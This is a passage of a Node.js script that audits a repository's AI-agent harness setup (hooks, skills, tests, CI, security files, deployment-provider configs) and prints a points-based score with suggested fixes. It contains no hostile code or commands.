#!/usr/bin/env node

const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  countPythonTestFiles,
  gitignoreIgnoresEnvFiles,
  hasPythonTestSuite,
} = require('./lib/harness-audit-consumer');

const CATEGORIES = [
  'Tool Coverage',
  'Context Efficiency',
  'Quality Gates',
  'Memory Persistence',
  'Eval Coverage',
  'Security Guardrails',
  'Cost Efficiency',
  'GitHub Integration',
  'Vercel Integration',
  'Netlify Integration',
  'Cloudflare Integration',
  'Fly Integration',
];

const RUBRIC_VERSION = '2026-05-19';

const PROVIDERS = {
  Vercel: {
    detect: (rootDir) =>
      fileExists(rootDir, 'vercel.json') ||
      fileExists(rootDir, '.vercel/project.json') ||
      fileExists(rootDir, '.vercel'),
    keyPattern: /vercel/i,
    buildPattern: /vercel/i,
    workflowPattern: /(vercel-action|vercel\s+(deploy|--prod))/i,
  },
  Netlify: {
    detect: (rootDir) =>
      fileExists(rootDir, 'netlify.toml') || fileExists(rootDir, '.netlify'),
    keyPattern: /netlify/i,
    buildPattern: /netlify/i,
    workflowPattern: /(netlify\/actions|netlify\s+deploy)/i,
  },
  Cloudflare: {
    detect: (rootDir) =>
      fileExists(rootDir, 'wrangler.toml') || fileExists(rootDir, 'wrangler.jsonc'),
    keyPattern: /\b(cloudflare|wrangler)\b/i,
    buildPattern: /(wrangler|cloudflare)/i,
    workflowPattern: /(cloudflare\/wrangler-action|wrangler\s+(deploy|publish))/i,
  },
  Fly: {
    detect: (rootDir) => fileExists(rootDir, 'fly.toml'),
    keyPattern: /fly[_-]?(api|io)/i,
    buildPattern: /fly\s+(deploy|launch)/i,
    workflowPattern: /(superfly\/flyctl-actions|flyctl\s+deploy|fly\s+deploy)/i,
  },
};

function getApplicableProviders(rootDir) {
  return Object.entries(PROVIDERS)
    .filter(([_, spec]) => spec.detect(rootDir))
    .map(([name]) => name);
}

function normalizeScope(scope) {
  const value = (scope || 'repo').toLowerCase();
  if (!['repo', 'hooks', 'skills', 'commands', 'agents'].includes(value)) {
    throw new Error(`Invalid scope: ${scope}`);
  }
  return value;
}

function parseArgs(argv) {
  const args = argv.slice(2);
  const parsed = {
    scope: 'repo',
    format: 'text',
    help: false,
    root: path.resolve(process.env.AUDIT_ROOT || process.cwd()),
  };

  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];

    if (arg === '--help' || arg === '-h') {
      parsed.help = true;
      continue;
    }

    if (arg === '--format') {
      parsed.format = (args[index + 1] || '').toLowerCase();
      index += 1;
      continue;
    }

    if (arg === '--scope') {
      parsed.scope = normalizeScope(args[index + 1]);
      index += 1;
      continue;
    }

    if (arg === '--root') {
      parsed.root = path.resolve(args[index + 1] || process.cwd());
      index += 1;
      continue;
    }

    if (arg.startsWith('--format=')) {
      parsed.format = arg.split('=')[1].toLowerCase();
      continue;
    }

    if (arg.startsWith('--scope=')) {
      parsed.scope = normalizeScope(arg.split('=')[1]);
      continue;
    }

    if (arg.startsWith('--root=')) {
      parsed.root = path.resolve(arg.slice('--root='.length));
      continue;
    }

    if (arg.startsWith('-')) {
      throw new Error(`Unknown argument: ${arg}`);
    }

    parsed.scope = normalizeScope(arg);
  }

  if (!['text', 'json'].includes(parsed.format)) {
    throw new Error(`Invalid format: ${parsed.format}. Use text or json.`);
  }

  return parsed;
}

function fileExists(rootDir, relativePath) {
  return fs.existsSync(path.join(rootDir, relativePath));
}

function readText(rootDir, relativePath) {
  return fs.readFileSync(path.join(rootDir, relativePath), 'utf8');
}

function countFiles(rootDir, relativeDir, extension) {
  const dirPath = path.join(rootDir, relativeDir);
  if (!fs.existsSync(dirPath)) {
    return 0;
  }

  const stack = [dirPath];
  let count = 0;

  while (stack.length > 0) {
    const current = stack.pop();
    const entries = fs.readdirSync(current, { withFileTypes: true });

    for (const entry of entries) {
      const nextPath = path.join(current, entry.name);
      if (entry.isDirectory()) {
        stack.push(nextPath);
      } else if (!extension || entry.name.endsWith(extension)) {
        count += 1;
      }
    }
  }

  return count;
}

function safeRead(rootDir, relativePath) {
  try {
    return readText(rootDir, relativePath);
  } catch (_error) {
    return '';
  }
}

function safeParseJson(text) {
  if (!text || !text.trim()) {
    return null;
  }

  try {
    return JSON.parse(text);
  } catch (_error) {
    return null;
  }
}

function hasFileWithExtension(rootDir, relativeDir, extensions) {
  const dirPath = path.join(rootDir, relativeDir);
  if (!fs.existsSync(dirPath)) {
    return false;
  }

  const allowed = Array.isArray(extensions) ? extensions : [extensions];
  const stack = [dirPath];

  while (stack.length > 0) {
    const current = stack.pop();
    const entries = fs.readdirSync(current, { withFileTypes: true });

    for (const entry of entries) {
      const nextPath = path.join(current, entry.name);
      if (entry.isDirectory()) {
        stack.push(nextPath);
        continue;
      }

      if (allowed.some((extension) => entry.name.endsWith(extension))) {
        return true;
      }
    }
  }

  return false;
}

function detectTargetMode(rootDir) {
  const packageJson = safeParseJson(safeRead(rootDir, 'package.json'));
  // 'everything-open-code' is the legacy package name, kept for older checkouts.
  if (['ecc-universal', 'everything-open-code'].includes(packageJson?.name)) {
    return 'repo';
  }

  if (
    fileExists(rootDir, 'scripts/harness-audit.js') &&
    fileExists(rootDir, '.opencode-plugin/plugin.json') &&
    fileExists(rootDir, 'agents') &&
    fileExists(rootDir, 'skills')
  ) {
    return 'repo';
  }

  return 'consumer';
}

// The everything-open-code entries below are legacy install ids, kept so
// existing 1.x installs are still detected.
const ECC_PLUGIN_KEY_PATTERNS = [
  /^ecc@/i,
  /^everything-open-code@/i,
];

const ECC_LEGACY_PLUGIN_DIRS = [
  'ecc',
  'ecc@ecc',
  'everything-open-code',
  'everything-open-code@everything-open-code',
];

const ECC_CACHE_MARKETPLACES = ['everything-open-code', 'ecc'];
const ECC_CACHE_PLUGIN_NAMES = ['ecc', 'everything-open-code'];

function uniquePaths(paths) {
  return [...new Set(paths.filter(Boolean))];
}

function compareVersionDesc(a, b) {
  const partsA = String(a).split('.').map(part => parseInt(part, 10) || 0);
  const partsB = String(b).split('.').map(part => parseInt(part, 10) || 0);
  const length = Math.max(partsA.length, partsB.length);

  for (let index = 0; index < length; index += 1) {
    const valueA = partsA[index] || 0;
    const valueB = partsB[index] || 0;
    if (valueA !== valueB) {
      return valueB - valueA;
    }
  }

  return 0;
}

function findPluginJsonUnder(installRoot) {
  const pluginJson = path.join(installRoot, '.opencode-plugin', 'plugin.json');
  if (fs.existsSync(pluginJson)) {
    return pluginJson;
  }

  const fallback = path.join(installRoot, 'plugin.json');
  return fs.existsSync(fallback) ? fallback : null;
}

function findPluginInstallFromManifest(installedPluginsPaths) {
  for (const installedPath of installedPluginsPaths) {
    if (!fs.existsSync(installedPath)) {
      continue;
    }

    const manifest = safeParseJson(safeRead(path.dirname(installedPath), path.basename(installedPath)));
    if (!manifest || !manifest.plugins) {
      continue;
    }

    for (const [key, value] of Object.entries(manifest.plugins)) {
      if (!ECC_PLUGIN_KEY_PATTERNS.some(pattern => pattern.test(key))) {
        continue;
      }

      const entries = Array.isArray(value) ? value : [];
      for (const entry of entries) {
        if (!entry || typeof entry.installPath !== 'string' || !entry.installPath.trim()) {
          continue;
        }

        const installRoot = path.isAbsolute(entry.installPath)
          ? entry.installPath
          : path.resolve(path.dirname(installedPath), entry.installPath);
        const hit = findPluginJsonUnder(installRoot);
        if (hit) {
          return hit;
        }
      }
    }
  }

  return null;
}

function findPluginInstallFlatLayout(candidateRoots) {
  for (const pluginsDir of candidateRoots) {
    for (const pluginDir of ECC_LEGACY_PLUGIN_DIRS) {
      const hit = findPluginJsonUnder(path.join(pluginsDir, pluginDir));
      if (hit) {
        return hit;
      }
    }
  }

  return null;
}

function findPluginInstallMarketplaceCache(candidateRoots) {
  for (const pluginsDir of candidateRoots) {
    for (const marketplace of ECC_CACHE_MARKETPLACES) {
      for (const pluginName of ECC_CACHE_PLUGIN_NAMES) {
        const pluginRoot = path.join(pluginsDir, 'cache', marketplace, pluginName);
        if (!fs.existsSync(pluginRoot)) {
          continue;
        }

        let versions = [];
        try {
          versions = fs
            .readdirSync(pluginRoot, { withFileTypes: true })
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name)
            .sort(compareVersionDesc);
        } catch {
          continue;
        }

        for (const version of versions) {
          const hit = findPluginJsonUnder(path.join(pluginRoot, version));
          if (hit) {
            return hit;
          }
        }
      }
    }
  }

  return null;
}

function findPluginInstall(rootDir) {
  const homeDirs = uniquePaths([
    process.env.HOME,
    process.env.USERPROFILE,
    os.homedir(),
  ]);
  const pluginRoots = uniquePaths([
    path.join(rootDir, '.opencode', 'plugins'),
    ...homeDirs.map(homeDir => path.join(homeDir, '.opencode', 'plugins')),
  ]);
  const installedPluginsPaths = uniquePaths([
    path.join(rootDir, '.opencode', 'plugins', 'installed_plugins.json'),
    ...homeDirs.map(homeDir => path.join(homeDir, '.opencode', 'plugins', 'installed_plugins.json')),
  ]);
  const flatRoots = uniquePaths([
    ...pluginRoots,
    ...pluginRoots.map(pluginsDir => path.join(pluginsDir, 'marketplaces')),
  ]);

  return (
    findPluginInstallFromManifest(installedPluginsPaths)
    || findPluginInstallFlatLayout(flatRoots)
    || findPluginInstallMarketplaceCache(pluginRoots)
  );
}

function getRepoChecks(rootDir) {
  const packageJson = safeParseJson(safeRead(rootDir, 'package.json'));
  const commandPrimary = safeRead(rootDir, 'commands/harness-audit.md').trim();
  const commandParity = safeRead(rootDir, '.opencode/commands/harness-audit.md').trim();
  const hooksJson = safeRead(rootDir, 'hooks/hooks.json');

  return [
    {
      id: 'tool-hooks-config',
      category: 'Tool Coverage',
      points: 2,
      scopes: ['repo', 'hooks'],
      path: 'hooks/hooks.json',
      description: 'Hook configuration file exists',
      pass: fileExists(rootDir, 'hooks/hooks.json'),
      fix: 'Create hooks/hooks.json and define baseline hook events.',
    },
    {
      id: 'tool-hooks-impl-count',
      category: 'Tool Coverage',
      points: 2,
      scopes: ['repo', 'hooks'],
      path: 'scripts/hooks/',
      description: 'At least 8 hook implementation scripts exist',
      pass: countFiles(rootDir, 'scripts/hooks', '.js') >= 8,
      fix: 'Add missing hook implementations in scripts/hooks/.',
    },
    {
      id: 'tool-agent-count',
      category: 'Tool Coverage',
      points: 2,
      scopes: ['repo', 'agents'],
      path: 'agents/',
      description: 'At least 10 agent definitions exist',
      pass: countFiles(rootDir, 'agents', '.md') >= 10,
      fix: 'Add or restore agent definitions under agents/.',
    },
    {
      id: 'tool-skill-count',
      category: 'Tool Coverage',
      points: 2,
      scopes: ['repo', 'skills'],
      path: 'skills/',
      description: 'At least 20 skill definitions exist',
      pass: countFiles(rootDir, 'skills', 'SKILL.md') >= 20,
      fix: 'Add missing skill directories with SKILL.md definitions.',
    },
    {
      id: 'tool-command-parity',
      category: 'Tool Coverage',
      points: 2,
      scopes: ['repo', 'commands'],
      path: '.opencode/commands/harness-audit.md',
      description: 'Harness-audit command parity exists between primary and OpenCode command docs',
      pass: commandPrimary.length > 0 && commandPrimary === commandParity,
      fix: 'Sync commands/harness-audit.md and .opencode/commands/harness-audit.md.',
    },
    {
      id: 'context-strategic-compact',
      category: 'Context Efficiency',
      points: 3,
      scopes: ['repo', 'skills'],
      path: 'skills/strategic-compact/SKILL.md',
      description: 'Strategic compaction guidance is present',
      pass: fileExists(rootDir, 'skills/strategic-compact/SKILL.md'),
      fix: 'Add strategic context compaction guidance at skills/strategic-compact/SKILL.md.',
    },
    {
      id: 'context-suggest-compact-hook',
      category: 'Context Efficiency',
      points: 3,
      scopes: ['repo', 'hooks'],
      path: 'scripts/hooks/suggest-compact.js',
      description: 'Suggest-compact automation hook exists',
      pass: fileExists(rootDir, 'scripts/hooks/suggest-compact.js'),
      fix: 'Implement scripts/hooks/suggest-compact.js for context pressure hints.',
    },
    {
      id: 'context-model-route',
      category: 'Context Efficiency',
      points: 2,
      scopes: ['repo', 'commands'],
      path: 'commands/model-route.md',
      description: 'Model routing command exists',
      pass: fileExists(rootDir, 'commands/model-route.md'),
      fix: 'Add model-route command guidance in commands/model-route.md.',
    },
    {
      id: 'context-token-doc',
      category: 'Context Efficiency',
      points: 2,
      scopes: ['repo'],
      path: 'docs/token-optimization.md',
      description: 'Token optimization documentation exists',
      pass: fileExists(rootDir, 'docs/token-optimization.md'),
      fix: 'Add docs/token-optimization.md with concrete context-cost controls.',
    },
    {
      id: 'quality-test-runner',
      category: 'Quality Gates',
      points: 3,
      scopes: ['repo'],
      path: 'tests/run-all.js',
      description: 'Central test runner exists',
      pass: fileExists(rootDir, 'tests/run-all.js'),
      fix: 'Add tests/run-all.js to enforce complete suite execution.',
    },
    {
      id: 'quality-ci-validations',
      category: 'Quality Gates',
      points: 3,
      scopes: ['repo'],
      path: 'package.json',
      description: 'Test script runs validator chain before tests',
      pass: typeof packageJson?.scripts?.test === 'string' && packageJson?.scripts?.test.includes('validate-commands.js') && packageJson?.scripts?.test.includes('tests/run-all.js'),
      fix: 'Update package.json test script to run validators plus tests/run-all.js.',
    },
    {
      id: 'quality-hook-tests',
      category: 'Quality Gates',
      points: 2,
      scopes: ['repo', 'hooks'],
      path: 'tests/hooks/hooks.test.js',
      description: 'Hook coverage test file exists',
      pass: fileExists(rootDir, 'tests/hooks/hooks.test.js'),
      fix: 'Add tests/hooks/hooks.test.js for hook behavior validation.',
    },
    {
      id: 'quality-doctor-script',
      category: 'Quality Gates',
      points: 2,
      scopes: ['repo'],
      path: 'scripts/doctor.js',
      description: 'Installation drift doctor script exists',
      pass: fileExists(rootDir, 'scripts/doctor.js'),
      fix: 'Add scripts/doctor.js for install-state integrity checks.',
    },
    {
      id: 'memory-hooks-dir',
      category: 'Memory Persistence',
      points: 4,
      scopes: ['repo', 'hooks'],
      path: 'hooks/memory-persistence/',
      description: 'Memory persistence hooks directory exists',
      pass: fileExists(rootDir, 'hooks/memory-persistence'),
      fix: 'Add hooks/memory-persistence with lifecycle hook definitions.',
    },
    {
      id: 'memory-session-hooks',
      category: 'Memory Persistence',
      points: 4,
      scopes: ['repo', 'hooks'],
      path: 'scripts/hooks/session-start.js',
      description: 'Session start/end persistence scripts exist',
      pass: fileExists(rootDir, 'scripts/hooks/session-start.js') && fileExists(rootDir, 'scripts/hooks/session-end.js'),
      fix: 'Implement scripts/hooks/session-start.js and scripts/hooks/session-end.js.',
    },
    {
      id: 'memory-learning-skill',
      category: 'Memory Persistence',
      points: 2,
      scopes: ['repo', 'skills'],
      path: 'skills/continuous-learning-v2/SKILL.md',
      description: 'Continuous learning v2 skill exists',
      pass: fileExists(rootDir, 'skills/continuous-learning-v2/SKILL.md'),
      fix: 'Add skills/continuous-learning-v2/SKILL.md for memory evolution flow.',
    },
    {
      id: 'eval-skill',
      category: 'Eval Coverage',
      points: 4,
      scopes: ['repo', 'skills'],
      path: 'skills/eval-harness/SKILL.md',
      description: 'Eval harness skill exists',
      pass: fileExists(rootDir, 'skills/eval-harness/SKILL.md'),
      fix: 'Add skills/eval-harness/SKILL.md for pass/fail regression evaluation.',
    },
    {
      id: 'eval-commands',
      category: 'Eval Coverage',
      points: 4,
      scopes: ['repo', 'commands', 'skills'],
      path: 'commands/checkpoint.md',
      description: 'Checkpoint command and eval/verification skills exist',
      pass: fileExists(rootDir, 'commands/checkpoint.md') && fileExists(rootDir, 'skills/eval-harness/SKILL.md') && fileExists(rootDir, 'skills/verification-loop/SKILL.md'),
      fix: 'Add checkpoint command plus eval-harness and verification-loop skills to standardize verification loops.',
    },
    {
      id: 'eval-tests-presence',
      category: 'Eval Coverage',
      points: 2,
      scopes: ['repo'],
      path: 'tests/',
      description: 'At least 10 test files exist',
      pass: countFiles(rootDir, 'tests', '.test.js') >= 10,
      fix: 'Increase automated test coverage across scripts/hooks/lib.',
    },
    {
      id: 'security-review-skill',
      category: 'Security Guardrails',
      points: 3,
      scopes: ['repo', 'skills'],
      path: 'skills/security-review/SKILL.md',
      description: 'Security review skill exists',
      pass: fileExists(rootDir, 'skills/security-review/SKILL.md'),
      fix: 'Add skills/security-review/SKILL.md for security checklist coverage.',
    },
    {
      id: 'security-agent',
      category: 'Security Guardrails',
      points: 3,
      scopes: ['repo', 'agents'],
      path: 'agents/security-reviewer.md',
      description: 'Security reviewer agent exists',
      pass: fileExists(rootDir, 'agents/security-reviewer.md'),
      fix: 'Add agents/security-reviewer.md for delegated security audits.',
    },
    {
      id: 'security-prompt-hook',
      category: 'Security Guardrails',
      points: 2,
      scopes: ['repo', 'hooks'],
      path: 'hooks/hooks.json',
      description: 'Hooks include prompt submission guardrail event references',
      pass: hooksJson.includes('beforeSubmitPrompt') || hooksJson.includes('PreToolUse'),
      fix: 'Add prompt/tool preflight security guards in hooks/hooks.json.',
    },
    {
      id: 'security-scan-command',
      category: 'Security Guardrails',
      points: 2,
      scopes: ['repo', 'commands'],
      path: 'commands/security-scan.md',
      description: 'Security scan command exists',
      pass: fileExists(rootDir, 'commands/security-scan.md'),
      fix: 'Add commands/security-scan.md with scan and remediation workflow.',
    },
    {
      id: 'cost-skill',
      category: 'Cost Efficiency',
      points: 4,
      scopes: ['repo', 'skills'],
      path: 'skills/cost-aware-llm-pipeline/SKILL.md',
      description: 'Cost-aware LLM skill exists',
      pass: fileExists(rootDir, 'skills/cost-aware-llm-pipeline/SKILL.md'),
      fix: 'Add skills/cost-aware-llm-pipeline/SKILL.md for budget-aware routing.',
    },
    {
      id: 'cost-doc',
      category: 'Cost Efficiency',
      points: 3,
      scopes: ['repo'],
      path: 'docs/token-optimization.md',
      description: 'Cost optimization documentation exists',
      pass: fileExists(rootDir, 'docs/token-optimization.md'),
      fix: 'Create docs/token-optimization.md with target settings and tradeoffs.',
    },
    {
      id: 'cost-model-route-command',
      category: 'Cost Efficiency',
      points: 3,
      scopes: ['repo', 'commands'],
      path: 'commands/model-route.md',
      description: 'Model route command exists for complexity-aware routing',
      pass: fileExists(rootDir, 'commands/model-route.md'),
      fix: 'Add commands/model-route.md and route policies for cheap-default execution.',
    },
    ...buildGithubChecks(rootDir),
  ];
}

// GitHub Integration is intentionally repo-scoped. Scoped audits such as hooks,
// skills, commands, and agents should keep reporting only that surface.
function buildGithubChecks(rootDir) {
  return [
    {
      id: 'github-workflows',
      category: 'GitHub Integration',
      points: 3,
      scopes: ['repo'],
      path: '.github/workflows/',
      description: 'GitHub Actions workflows are checked in',
      pass: hasFileWithExtension(rootDir, '.github/workflows', ['.yml', '.yaml']),
      fix: 'Add at least one workflow under .github/workflows/ so CI runs on every PR.',
    },
    {
      id: 'github-pr-template',
      category: 'GitHub Integration',
      points: 2,
      scopes: ['repo'],
      path: '.github/PULL_REQUEST_TEMPLATE.md',
      description: 'A pull request template is configured',
      pass:
        fileExists(rootDir, '.github/PULL_REQUEST_TEMPLATE.md') ||
        fileExists(rootDir, '.github/pull_request_template.md'),
      fix: 'Add .github/PULL_REQUEST_TEMPLATE.md so PR descriptions follow a consistent shape.',
    },
    {
      id: 'github-issue-templates',
      category: 'GitHub Integration',
      points: 2,
      scopes: ['repo'],
      path: '.github/ISSUE_TEMPLATE/',
      description: 'Issue templates are configured',
      pass: hasFileWithExtension(rootDir, '.github/ISSUE_TEMPLATE', ['.md', '.yml', '.yaml']),
      fix: 'Add at least one issue template under .github/ISSUE_TEMPLATE/.',
    },
    {
      id: 'github-codeowners',
      category: 'GitHub Integration',
      points: 1,
      scopes: ['repo'],
      path: '.github/CODEOWNERS',
      description: 'A CODEOWNERS file routes reviews',
      pass:
        fileExists(rootDir, 'CODEOWNERS') ||
        fileExists(rootDir, '.github/CODEOWNERS') ||
        fileExists(rootDir, 'docs/CODEOWNERS'),
      fix: 'Add a CODEOWNERS file so PRs auto-request the right reviewers.',
    },
    {
      id: 'github-dep-updates',
      category: 'GitHub Integration',
      points: 2,
      scopes: ['repo'],
      path: '.github/dependabot.yml',
      description: 'Automated dependency updates are configured',
      pass:
        fileExists(rootDir, '.github/dependabot.yml') ||
        fileExists(rootDir, '.github/dependabot.yaml') ||
        fileExists(rootDir, 'renovate.json') ||
        fileExists(rootDir, '.github/renovate.json') ||
        fileExists(rootDir, '.renovaterc'),
      fix: 'Add a Dependabot or Renovate config so dependency updates land automatically.',
    },
  ];
}

function readAllWorkflowsText(rootDir) {
  const dir = path.join(rootDir, '.github/workflows');
  if (!fs.existsSync(dir)) {
    return '';
  }

  const stack = [dir];
  let combined = '';

  while (stack.length > 0) {
    const current = stack.pop();
    const entries = fs.readdirSync(current, { withFileTypes: true });

    for (const entry of entries) {
      const nextPath = path.join(current, entry.name);
      if (entry.isDirectory()) {
        stack.push(nextPath);
      } else if (entry.name.endsWith('.yml') || entry.name.endsWith('.yaml')) {
        try {
          combined += `${fs.readFileSync(nextPath, 'utf8')}\n`;
        } catch (_error) {
          // Ignore unreadable workflow files; the finding should stay deterministic.
        }
      }
    }
  }

  return combined;
}

function buildProviderChecks(rootDir, provider, sharedContext) {
  const spec = PROVIDERS[provider];
  const packageJson = sharedContext.packageJson || {};
  const scriptsText = Object.values(packageJson.scripts || {}).join('\n');
  const category = `${provider} Integration`;

  return [
    {
      id: `${provider.toLowerCase()}-config`,
      category,
      points: 3,
      scopes: ['repo'],
      path: `${provider} config`,
      description: `${provider} deployment config is checked in`,
      pass: spec.detect(rootDir),
      fix: `Commit ${provider} configuration so deploys are reproducible from source.`,
    },
    {
      id: `${provider.toLowerCase()}-build-script`,
      category,
      points: 2,
      scopes: ['repo'],
      path: 'package.json scripts',
      description: `package.json scripts reference ${provider}`,
      pass: spec.buildPattern.test(scriptsText),
      fix: `Add a build or deploy script in package.json that runs ${provider}.`,
    },
    {
      id: `${provider.toLowerCase()}-env-doc`,
      category,
      points: 2,
      scopes: ['repo'],
      path: '.env.example',
      description: `${provider} env keys are documented in .env.example`,
      pass: spec.keyPattern.test(sharedContext.envExample),
      fix: `Document ${provider} environment variables in .env.example.`,
    },
    {
      id: `${provider.toLowerCase()}-workflow-uses`,
      category,
      points: 3,
      scopes: ['repo'],
      path: '.github/workflows/',
      description: `A GitHub workflow uses the ${provider} action or CLI`,
      pass: spec.workflowPattern.test(sharedContext.workflowsText),
      fix: `Reference the ${provider} action or CLI from a workflow under .github/workflows/.`,
    },
  ];
}

function collectProviderChecks(rootDir, packageJson) {
  const providers = getApplicableProviders(rootDir);
  if (providers.length === 0) {
    return [];
  }

  const sharedContext = {
    packageJson: packageJson || {},
    envExample: `${safeRead(rootDir, '.env.example')}\n${safeRead(rootDir, '.env.sample')}`,
    workflowsText: readAllWorkflowsText(rootDir),
  };

  return providers.flatMap(provider => buildProviderChecks(rootDir, provider, sharedContext));
}

function getConsumerChecks(rootDir) {
  const packageJson = safeParseJson(safeRead(rootDir, 'package.json'));
  const gitignore = safeRead(rootDir, '.gitignore');
  const projectHooks = safeRead(rootDir, '.opencode/settings.json');
  const pluginInstall = findPluginInstall(rootDir);
  const pythonTestCount = countPythonTestFiles(rootDir);

  return [
    {
      id: 'consumer-plugin-install',
      category: 'Tool Coverage',
      points: 4,
      scopes: ['repo'],
      path: '~/.opencode/plugins/ecc/ (legacy everything-open-code paths also supported)',
      description: 'ECC is installed for the active user or project',
      pass: Boolean(pluginInstall),
      fix: 'Install the ECC plugin for this user or project before auditing project-specific harness quality.',
    },
    {
      id: 'consumer-project-overrides',
      category: 'Tool Coverage',
      points: 3,
      scopes: ['repo', 'hooks', 'skills', 'commands', 'agents'],
      path: '.opencode/',
      description: 'Project-specific harness overrides exist under .opencode/',
      pass: countFiles(rootDir, '.opencode/agents', '.md') > 0 ||
        countFiles(rootDir, '.opencode/skills', 'SKILL.md') > 0 ||
        countFiles(rootDir, '.opencode/commands', '.md') > 0 ||
        fileExists(rootDir, '.opencode/settings.json') ||
        fileExists(rootDir, '.opencode/hooks.json'),
      fix: 'Add project-local .opencode hooks, commands, skills, or settings that tailor ECC to this repo.',
    },
    {
      id: 'consumer-instructions',
      category: 'Context Efficiency',
      points: 3,
      scopes: ['repo'],
      path: 'AGENTS.md',
      description: 'The project has explicit agent or instruction context',
      pass: fileExists(rootDir, 'AGENTS.md') || fileExists(rootDir, 'AGENTS.md') || fileExists(rootDir, '.opencode/AGENTS.md'),
      fix: 'Add AGENTS.md or AGENTS.md so the harness has project-specific instructions.',
    },
    {
      id: 'consumer-project-config',
      category: 'Context Efficiency',
      points: 2,
      scopes: ['repo', 'hooks'],
      path: '.mcp.json',
      description: 'The project declares local MCP or Claude settings',
      pass: fileExists(rootDir, '.mcp.json') || fileExists(rootDir, '.opencode/settings.json') || fileExists(rootDir, '.opencode/settings.local.json'),
      fix: 'Add .mcp.json or .opencode/settings.json so project-local tool configuration is explicit.',
    },
    {
      id: 'consumer-test-suite',
      category: 'Quality Gates',
      points: 4,
      scopes: ['repo'],
      path: 'tests/',
      description: 'The project has an automated test entrypoint',
      pass: typeof packageJson?.scripts?.test === 'string' ||
        countFiles(rootDir, 'tests', '.test.js') > 0 ||
        hasFileWithExtension(rootDir, '.', ['.spec.js', '.spec.ts', '.test.ts']) ||
        hasPythonTestSuite(rootDir, pythonTestCount),
      fix: 'Add a test script or checked-in tests so harness recommendations can be verified automatically.',
    },
    {
      id: 'consumer-ci-workflow',
      category: 'Quality Gates',
      points: 3,
      scopes: ['repo'],
      path: '.github/workflows/',
      description: 'The project has CI workflows checked in',
      pass: hasFileWithExtension(rootDir, '.github/workflows', ['.yml', '.yaml']),
      fix: 'Add at least one CI workflow so harness and test checks run outside local development.',
    },
    {
      id: 'consumer-memory-notes',
      category: 'Memory Persistence',
      points: 2,
      scopes: ['repo'],
      path: '.opencode/memory.md',
      description: 'Project memory or durable notes are checked in',
      pass: fileExists(rootDir, '.opencode/memory.md') || countFiles(rootDir, 'docs/adr', '.md') > 0,
      fix: 'Add durable project memory such as .opencode/memory.md or ADRs under docs/adr/.',
    },
    {
      id: 'consumer-eval-coverage',
      category: 'Eval Coverage',
      points: 2,
      scopes: ['repo'],
      path: 'evals/',
      description: 'The project has evals or multiple automated tests',
      pass: countFiles(rootDir, 'evals', null) > 0 ||
        countFiles(rootDir, 'tests', '.test.js') + pythonTestCount >= 3,
      fix: 'Add eval fixtures or at least a few focused automated tests for critical flows.',
    },
    {
      id: 'consumer-security-policy',
      category: 'Security Guardrails',
      points: 2,
      scopes: ['repo'],
      path: 'SECURITY.md',
      description: 'The project exposes a security policy or automated dependency scanning',
      pass: fileExists(rootDir, 'SECURITY.md') || fileExists(rootDir, '.github/dependabot.yml') || fileExists(rootDir, '.github/codeql.yml'),
      fix: 'Add SECURITY.md or dependency/code scanning configuration to document the project security posture.',
    },
    {
      id: 'consumer-secret-hygiene',
      category: 'Security Guardrails',
      points: 2,
      scopes: ['repo'],
      path: '.gitignore',
      description: 'The project ignores common secret env files',
      pass: gitignoreIgnoresEnvFiles(gitignore),
      fix: 'Ignore .env-style files in .gitignore so secrets do not land in the repo.',
    },
    {
      id: 'consumer-hook-guardrails',
      category: 'Security Guardrails',
      points: 2,
      scopes: ['repo', 'hooks'],
      path: '.opencode/settings.json',
      description: 'Project-local hook settings reference tool/prompt guardrails',
      pass: projectHooks.includes('PreToolUse') || projectHooks.includes('beforeSubmitPrompt') || fileExists(rootDir, '.opencode/hooks.json'),
      fix: 'Add project-local hook settings or hook definitions for prompt/tool guardrails.',
    },
    ...buildGithubChecks(rootDir),
    ...collectProviderChecks(rootDir, packageJson),
  ];
}

function summarizeCategoryScores(checks) {
  const scores = {};
  for (const category of CATEGORIES) {
    const inCategory = checks.filter(check => check.category === category);
    const max = inCategory.reduce((sum, check) => sum + check.points, 0);
    const earned = inCategory
      .filter(check => check.pass)
      .reduce((sum, check) => sum + check.points, 0);

    const normalized = max === 0 ? 0 : Math.round((earned / max) * 10);
    scores[category] = {
      score: normalized,
      earned,
      max,
    };
  }

  return scores;
}

function buildReport(scope, options = {}) {
  const rootDir = path.resolve(options.rootDir || process.cwd());
  const targetMode = options.targetMode || detectTargetMode(rootDir);
  const checks = (targetMode === 'repo' ? getRepoChecks(rootDir) : getConsumerChecks(rootDir))
    .filter(check => check.scopes.includes(scope));
  const categoryScores = summarizeCategoryScores(checks);
  const maxScore = checks.reduce((sum, check) => sum + check.points, 0);
  const overallScore = checks
    .filter(check => check.pass)
    .reduce((sum, check) => sum + check.points, 0);
  const applicableCategories = CATEGORIES.filter(name => categoryScores[name]?.max > 0);

  const failedChecks = checks.filter(check => !check.pass);
  const topActions = failedChecks
    .sort((left, right) => right.points - left.points)
    .slice(0, 3)
    .map(check => ({
      action: check.fix,
      path: check.path,
      category: check.category,
      points: check.points,
    }));

  return {
    scope,
    root_dir: rootDir,
    target_mode: targetMode,
    deterministic: true,
    rubric_version: RUBRIC_VERSION,
    overall_score: overallScore,
    max_score: maxScore,
    categories: categoryScores,
    applicable_categories: applicableCategories,
    category_count: applicableCategories.length,
    checks: checks.map(check => ({
      id: check.id,
      category: check.category,
      points: check.points,
      path: check.path,
      description: check.description,
      pass: check.pass,
    })),
    top_actions: topActions,
  };
}

function printText(report) {
  console.log(`Harness Audit (${report.scope}, ${report.target_mode}): ${report.overall_score}/${report.max_score}`);
  console.log(`Root: ${report.root_dir}`);
  console.log('');

  for (const category of CATEGORIES) {
    const data = report.categories[category];
    if (!data || data.max === 0) {
      continue;
    }

    console.log(`- ${category}: ${data.score}/10 (${data.earned}/${data.max} pts)`);
  }

  const failed = report.checks.filter(check => !check.pass);
  console.log('');
  console.log(`Checks: ${report.checks.length} total, ${failed.length} failing`);

  if (failed.length > 0) {
    console.log('');
    console.log('Top 3 Actions:');
    report.top_actions.forEach((action, index) => {
      console.log(`${index + 1}) [${action.category}] ${action.action} (${action.path})`);
    });
  }
}

function showHelp(exitCode = 0) {
  console.log(`
Usage: node scripts/harness-audit.js [scope] [--scope <repo|hooks|skills|commands|agents>] [--format <text|json>]
       [--root <path>]

Deterministic harness audit based on explicit file/rule checks.
